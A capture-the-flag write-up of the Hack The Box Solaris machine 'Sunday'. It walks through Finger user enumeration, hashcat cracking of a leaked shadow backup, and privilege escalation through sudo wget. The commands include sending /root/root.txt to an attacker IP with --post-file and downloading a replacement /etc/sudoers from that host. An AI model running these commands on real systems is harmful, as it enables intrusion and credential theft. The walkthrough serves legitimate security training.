# Sunday (HTB)

> Platform: Hack The Box  
> OS: Solaris  
> Difficulty: Easy  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -sC -sV -p- sunday.htb → 79 (Finger), 22022 (SSH OpenSSH 8.4)
└── Platform: Solaris

Enumeration (Finger)
├── msfconsole → scanner/finger/finger_users
└── ./finger-user-enum.pl -u root -t <target>
    └── Response: root ... <PASSWORD> (Office Location = password hint)

Foothold (SSH)
├── ssh -p 22022 sunny@sunday.htb → password: <PASSWORD>
└── sudo -l → (root) NOPASSWD: /root/troll - TRAP

Lateral Movement (Backup)
├── cd /backup → agent22.backup, shadow.backup
├── sammy:<SHA256_HASH>
├── sunny:<SHA256_HASH>
└── hashcat -m 7400 → sammy:<PASSWORD>

User Flag
├── ssh -p 22022 sammy@sunday.htb (<PASSWORD>)
└── cat user.txt → <USER_FLAG>

Privilege Escalation (sudo wget)
├── sudo -l → (root) NOPASSWD: /usr/bin/wget
├── Exfil: sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
├── nc -lvnp 8000 → root flag (<ROOT_FLAG>)
├── Overwriting /etc/sudoers:
│   ├── echo "sammy ALL=(ALL) NOPASSWD: ALL" > sudoers
│   └── sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
└── sudo su → root
```

> Note: All flags, passwords, and hashes have been masked for ethical reasons.

---

## Machine Briefing

Solaris with the Finger service on port 79 and SSH on a non-standard port 22022. A backup of `/etc/shadow` is left in `/backup/`.

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sC -sV -p- sunday.htb
```

| Port  | Service | Version        |
|-------|---------|----------------|
| 79    | Finger  | Finger service |
| 22022 | SSH     | OpenSSH 8.4    |

Platform - Solaris.

---

## Enumeration (Finger)

```bash
msfconsole
use scanner/finger/finger_users
set RHOST 10.129.77.192
run
```

Users found: `root`, `sammy`, `sunny`, `adm`, `bin`, `daemon`, `sshd`, `openldap`.

```bash
./finger-user-enum.pl -u root -t 10.129.77.192
```

```
root@10.129.77.192: root     Super-User     pts/3     <Apr 24 10:37>     <PASSWORD>
```

The Office Location field contains `<PASSWORD>` - the administrator's hint.

---

## Foothold

```bash
ssh -p 22022 sunny@sunday.htb
# Password: <PASSWORD>

sudo -l
# User sunny may run the following commands on sunday:
#     (root) NOPASSWD: /root/troll

sudo /root/troll
# testing
# uid=0(root) gid=0(root)
```

The script only prints `id`. It does not grant a root shell.

---

## Lateral Movement (Backup)

```bash
cd /backup
ls
# agent22.backup  shadow.backup

cat shadow.backup
```

```
sammy:<SHA256_HASH>:6445::::::
sunny:<SHA256_HASH>:17636::::::
```

Format `$5$` - SHA-256 crypt, hashcat mode **7400**.

```bash
echo '<SHA256_HASH>' > hashes.txt
hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
# <PASSWORD>
```

**Important nuance:** only the hash, without `username:`.

```bash
ssh -p 22022 sammy@sunday.htb
# Password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

---

## Privilege Escalation

```bash
sudo -l
# User sammy may run the following commands on sunday:
#     (root) NOPASSWD: /usr/bin/wget
```

### Exfil root.txt

```bash
nc -lvnp 8000
sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
# <ROOT_FLAG>
```

### Full root - overwriting /etc/sudoers

```bash
# Kali
echo "sammy ALL=(ALL) NOPASSWD: ALL" > sudoers
python3 -m http.server 8000

# target
sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
sudo su
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Flags

| Flag | Value                            |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Finger (79) - an underrated service.** Not only a user list, but also hints in fields like Office Location.
- **Non-standard ports** - always use `-p-`; SSH on 22022 is easy to miss.
- **Traps (`troll`)** - not every `sudo -l` result leads to real root.
- **Forgotten backup files** - `/backup/shadow.backup` provides hashes.
- **GTFOBins for wget** - `--post-file` for exfiltration, `-O` for overwriting system files.
- **Hash file formatting** - only the hash, without metadata.
